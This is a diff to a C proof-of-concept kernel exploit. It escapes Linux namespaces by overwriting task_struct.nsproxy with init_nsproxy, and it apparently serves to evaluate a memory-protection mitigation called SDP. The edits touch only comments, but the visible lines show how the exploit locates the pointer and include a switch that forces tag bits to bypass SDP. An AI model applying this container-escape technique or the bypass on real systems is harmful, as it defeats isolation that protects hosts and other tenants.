@@ -1,4 +1,4 @@
-// FZY: Add a simple proof of concept that overwrites task_struct.nsproxy to escape namespaces (e.g., mount/network/uts namespaces) by pointing it at init_nsproxy
+// SDP: Add a simple proof of concept that overwrites task_struct.nsproxy to escape namespaces (e.g., mount/network/uts namespaces) by pointing it at init_nsproxy
 
 #include <fcntl.h>
 #include <stdio.h>
@@ -134,7 +134,7 @@ int main(int argc, char *argv[]) {
   }
   printf("[+] Current task_struct address: 0x%lx\n", task_addr);
 
-  // FZY: Set to 1 to run the bookkeeping under SDP too, to check the rest of
+  // Set to 1 to run the bookkeeping under SDP too, to check the rest of
   // the steps on a non-enforcing build.  An enforcing one panics on the step 2
   // read below.
   const int sdp_bypass = 0;
@@ -142,7 +142,7 @@ int main(int argc, char *argv[]) {
 
   // Step 2: Read the nsproxy pointer from task_struct.
   //
-  // FZY: bookkeeping only - the attack needs the pointer's address and the
+  // bookkeeping only - the attack needs the pointer's address and the
   // value to write, not the old value.  Under SDP this read would trap before
   // the step 5 store, which is the access the attack really depends on.
   unsigned long nsproxy_ptr_addr = task_addr + nsproxy_offset;
@@ -154,7 +154,7 @@ int main(int argc, char *argv[]) {
     if (mode != 0) {
       printf("[+] SDP mode %d: nsproxy pointer (tagged): 0x%lx\n", mode,
              orig_nsproxy);
-      // FZY: Enable to bypass the mitigation and evaluate if the rest steps work
+      // Enable to bypass the mitigation and evaluate if the rest steps work
       // correctly
       orig_nsproxy = orig_nsproxy | 0xFFFF000000000000;
     }
